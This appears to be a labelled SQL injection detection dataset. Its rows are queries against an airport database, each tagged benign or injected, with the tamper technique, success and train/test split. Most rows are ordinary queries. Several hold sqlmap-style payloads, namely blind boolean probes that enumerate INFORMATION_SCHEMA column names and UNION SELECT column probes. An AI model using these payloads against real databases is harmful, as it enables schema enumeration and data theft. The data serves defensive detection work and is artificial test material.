"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""AW"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,AW 5,,,,select,airport-S19,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""K4M7"", ""heliport"", ""Norfolk Airport / Heenan-Menfi Memorial Airport"", 26.616596, -92.8585)",0,K4M7 heliport Norfolk Airport / Heenan-Menfi Memorial Airport 26.616596 -92.8585,,,,insert,airport-I1,,,train
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-0224"";",0,US-0224,,,,select,airport-S7,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('FXSH','TA67','FZQN','19GA');",0,FXSH TA67 FZQN 19GA,,,,update,airport-U10,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""MX"") OR a.elevation_ft > 1020.0",0,MX 1020.0,,,,select,airport-S11,,,test
"DELETE FROM regions WHERE name = ""Trnava Region"";",0,Trnava Region,,,,delete,airport-D8,,,test
"DELETE FROM regions WHERE name = ""Haute-Kotto"";",0,Haute-Kotto,,,,delete,airport-D8,,,test
"DELETE FROM airport_frequencies WHERE type = ""DEP"";",0,DEP,,,,delete,airport-D4,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Chu Lai Stagefield Army Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Chu Lai Stagefield Army Heliport,,,,select,airport-S14,,,test
"SELECT * FROM airport WHERE gps_code = ""SC65"" OR local_code = ""1M4""",0,SC65 1M4,,,,select,airport-S4,,,train
SELECT * FROM airport WHERE icao_code = 'SVCU';,0,SVCU,,,,select,airport-S1,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.8 AND  124.3  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  128.65  AND  119.475  ORDER BY frequency;",0,122.8 124.3 128.65 119.475,,,,select,airport-S13,,,test
"SELECT * FROM airport WHERE gps_code = ""SLPA"" OR local_code = ""42OI""",0,SLPA 42OI,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""TE95"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in (unassigned)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Cambodian airports"", ""%"");",0,TE95 Airports in (unassigned) Cambodian airports,,,,select,airport-S18,,,test
"UPDATE airport SET name = ""Zilfi Airport"" WHERE ident = ""US-1415""",0,Zilfi Airport US-1415,,,,update,airport-U1,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""US-NE""",0,SA US-NE,,,,select,airport-S8,,,test
"DELETE FROM navaids WHERE ident = ""BC"";",0,BC,,,,delete,airport-D6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PF"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,PF 4,,,,select,airport-S19,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""VU-TAE"", ""B"", ""Beltinci Municipality"", ""AS"", ""AR"")",0,VU-TAE B Beltinci Municipality AS AR,,,,insert,airport-I5,,,train
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""MV-07"", ""Jambyl Region"", ""EU"", ""LV"", ""https://en.wikipedia.org/wiki/Mary_Region"", ""Airports in (unassigned)"")",0,MV-07 Jambyl Region EU LV https://en.wikipedia.org/wiki/Mary_Region Airports in (unassigned),,,,insert,airport-I4,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""KFXY"", ""closed"", ""Cataract Scout Park Heliport"", 35.10868, -104.78900146484376)",0,KFXY closed Cataract Scout Park Heliport 35.10868 -104.78900146484376,,,,insert,airport-I1,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GT"" GROUP BY r.name ORDER BY r.name ASC;",0,GT,,,,select,airport-S16,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""PR"" OR c.name LIKE CONCAT(""%"", ""Mongolia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,PR Mongolia 5,,,,select,airport-S20,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""国立病院機構東広島医療センターヘリポート, National Health Organization Higashihiroshima Medical Center Heliport"") OR name LIKE ""Lenwood""",0,"国立病院機構東広島医療センターヘリポート, National Health Organization Higashihiroshima Medical Center Heliport Lenwood",,,,select,airport-S10,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""K-Fly Flying Field""",0,K-Fly Flying Field,,,,select,airport-S3,,,test
"DELETE FROM regions WHERE name = ""South Region"" AND 5742 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 9,1),2,1))>104) THEN 5742 ELSE (SELECT 6739 UNION SELECT 2471) END))-- -"";",1," South Region"" AND 5742 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 9,1),2,1))>104) THEN 5742 ELSE (SELECT 6739 UNION SELECT 2471) END))-- - ",exploit,equaltolike,success,delete,airport-D8,boolean-150,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Escalante Municipal Airport""",0,Escalante Municipal Airport,,,,select,airport-S3,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""(FPSOs)"";",0,(FPSOs),,,,select,airport-S15,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""De Soto Parish Airport"") AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- -"") OR name LIKE ""De Soto Parish Airport"") AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- -""",1," De Soto Parish Airport ) AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- - De Soto Parish Airport ) AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- - ",exploit,sleep2getlock,success,select,airport-S10,boolean-210,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Helicentro Ribeirão Preto Heliport""",0,Helicentro Ribeirão Preto Heliport,,,,select,airport-S3,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""North-Eastern Province"";",0,North-Eastern Province,,,,select,airport-S15,,,test
"UPDATE airport SET municipality = ""Eordaia"" WHERE iso_country = ""US""",0,Eordaia US,,,,update,airport-U2,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5399"" AS SIGNED) AND a.iso_country = ""KZ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5399 KZ,,,,select,airport-S22,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""24CD"";",0,24CD,,,,select,airport-S7,,,train
"SELECT id FROM airports WHERE elevation_feet BETWEEN 1580.0 AND 4849.0 AND longitude BETWEEN 86.06 AND -75.997803 AND name LIKE ""%OCoH3AnbqkXTbEvmu2Ib%"" OR name LIKE ""%zlS23RXsIYOGYGgaWo4F%"" AND iso_country LIKE ""FR""",0,1580.0 4849.0 86.06 -75.997803 OCoH3AnbqkXTbEvmu2Ib zlS23RXsIYOGYGgaWo4F FR,,,,select,airport-S23,,,train
"UPDATE airport_frequencies SET description = ""MISC"" WHERE airport_ident = ""NSFA"";",0,MISC NSFA,,,,update,airport-U5,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""BT"", ""Kiribati"", ""AF"", ""Airports in New Zealand"")",0,BT Kiribati AF Airports in New Zealand,,,,insert,airport-I6,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""GB-0202"", ""closed"", ""Lalitpur Airport"", 44.107778, -70.728798, 4620.0)",0,GB-0202 closed Lalitpur Airport 44.107778 -70.728798 4620.0,,,,insert,airport-I2,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 30.0",0,US 30.0,,,,select,airport-S11,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""VE"") OR a.elevation_ft > 2895.0",0,VE 2895.0,,,,select,airport-S11,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Imam Khomeini Hospital Heliport"");",0,Imam Khomeini Hospital Heliport,,,,select,airport-S12,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Pasanggerahan, Kampungbenteng"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Santa Rosa Department"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Georgian airports"", ""%"");",0,"Pasanggerahan, Kampungbenteng Airports in Santa Rosa Department Georgian airports",,,,select,airport-S18,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""KZ-ABA%' AND 6565 LIKE (SELECT (CASE WHEN (6565 LIKE 1603) THEN 6565 ELSE (SELECT 1603 UNION SELECT 2675) END))-- -"", ""Trujillo State"", ""EU"", ""AR"", ""https://en.wikipedia.org/wiki/Western_Cape"", ""Airports in Sumy Oblast"")",1, KZ-ABA%' AND 6565 LIKE (SELECT (CASE WHEN (6565 LIKE 1603) THEN 6565 ELSE (SELECT 1603 UNION SELECT 2675) END))-- - Trujillo State EU AR https://en.wikipedia.org/wiki/Western_Cape Airports in Sumy Oblast ,recon,equaltolike,success,insert,airport-I4,boolean-18,boolean,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-1560"",""small_airport')) AS lTiH WHERE 5634=5634 HAVING 6228=6206-- UIZn"", ""Old Santa Rosa Airport"",""https://en.wikipedia.org/wiki/Chokurdakh_Airport"",""EU"")",1, US-1560 small_airport')) AS lTiH WHERE 5634=5634 HAVING 6228=6206-- UIZn Old Santa Rosa Airport https://en.wikipedia.org/wiki/Chokurdakh_Airport EU ,recon,commentbeforeparentheses,failure,insert,airport-I3,boolean-12,boolean,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Plateau Department"";",0,Plateau Department,,,,select,airport-S15,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Trat Province"";",0,Trat Province,,,,select,airport-S15,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (20264, ""SEBL"", 2625.0, ""-7434""))) UnIoN aLL sEleCt 5700,5700,5700,5700,5700,5700,5700,5700,5700#"", 0, 0)",1," 20264 SEBL 2625.0 -7434""    UnIoN aLL sEleCt 5700,5700,5700,5700,5700,5700,5700,5700,5700# 0 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2329"" AS SIGNED) AND a.iso_country = ""MO"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2329 MO,,,,select,airport-S22,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Juan-les-Pins Ultralight Seaplane Base"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Juan-les-Pins Ultralight Seaplane Base,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Нацыянальны аэрапорт, Minsk 2 Airport"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Qacha's Nek District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""American airports"", ""%"");",0,"Нацыянальны аэрапорт, Minsk 2 Airport Airports in Qacha's Nek District American airports",,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""3NK7"",""heliport"", ""Susaki Airstrip"",""https://en.wikipedia.org/wiki/Pozna%C5%84-%C5%81awica_Airport"",""AS"")",0,3NK7 heliport Susaki Airstrip https://en.wikipedia.org/wiki/Pozna%C5%84-%C5%81awica_Airport AS,,,,insert,airport-I3,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Sermersooq Municipality"";",0,Sermersooq Municipality,,,,select,airport-S15,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Uruçuí;""",0,Uruçuí,,,,select,airport-S21,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""VI"" OR c.name LIKE CONCAT(""%"", ""Serbia"") AS kBJQ WHERE 3013=3013 AND 7865=7865-- gPKk"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",1," VI Serbia"") AS kBJQ WHERE 3013=3013 AND 7865=7865-- gPKk 4 ",recon,commentbeforeparentheses,success,select,airport-S20,boolean-252,boolean,test
"DELETE FROM airport WHERE name LIKE ""Santa Maria Agricola Airport"" OR keywords LIKE ""WMAA, WMAA"";  ",0,"Santa Maria Agricola Airport WMAA, WMAA",,,,delete,airport-D3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 131.01 AND  134.1  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.725  AND  121.9  ORDER BY frequency;",0,131.01 134.1 122.725 121.9,,,,select,airport-S13,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""AU-WA""",0,SA AU-WA,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AT"" GROUP BY r.name ORDER BY r.name ASC;",0,AT,,,,select,airport-S16,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 490.0",0,BR 490.0,,,,select,airport-S11,,,test
"UPDATE navaids SET name = ""Makokou"" WHERE ident = ""7B"";",0,Makokou 7B,,,,update,airport-U7,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""EC-U-A"", ""GB"", ""North Kazakhstan Region"", ""AF"", ""CL"")",0,EC-U-A GB North Kazakhstan Region AF CL,,,,insert,airport-I5,,,test
"SELECT * FROM airport WHERE gps_code = ""CLD2"" OR local_code = ""2TA9""",0,CLD2 2TA9,,,,select,airport-S4,,,test
"DELETE FROM airport WHERE ident=""GCLG"";",0,GCLG,,,,delete,airport-D1,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 5200.0",0,BR 5200.0,,,,select,airport-S11,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PY"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,PY 3,,,,select,airport-S19,,,train
SELECT * FROM airport WHERE icao_code = 'SDOU';,0,SDOU,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4304"" AS SIGNED) AND a.iso_country = ""ZA"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4304 ZA,,,,select,airport-S22,,,test
"UPDATE airport_frequencies SET description = ""BLAGNAC APP"" WHERE airport_ident = ""CA-0159"";",0,BLAGNAC APP CA-0159,,,,update,airport-U5,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""MKAD 35 Kilometr Helipad"");",0,MKAD 35 Kilometr Helipad,,,,select,airport-S12,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Kizuna Heliport""",0,Kizuna Heliport,,,,select,airport-S3,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (38292, ""SEBL"", 50.0, ""X') UNiON All SeLect 95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,CONCAt(0x716a766271,0x57677561684a77684f55,0x716a6b7071),95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95-- -"", 0, 0)",1," 38292 SEBL 50.0 X'  UNiON All SeLect 95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,CONCAt(0x716a766271,0x57677561684a77684f55,0x716a6b7071 ,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95-- - 0 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"UPDATE airport SET home_link = ""https://www.aena.es/en/asturias.html"" WHERE name = ""Hawks Run Airport""",0,https://www.aena.es/en/asturias.html Hawks Run Airport,,,,update,airport-U4,,,test
"SELECT * FROM airport WHERE gps_code = ""50OR"" OR local_code = ""NK77""",0,50OR NK77,,,,select,airport-S4,,,test
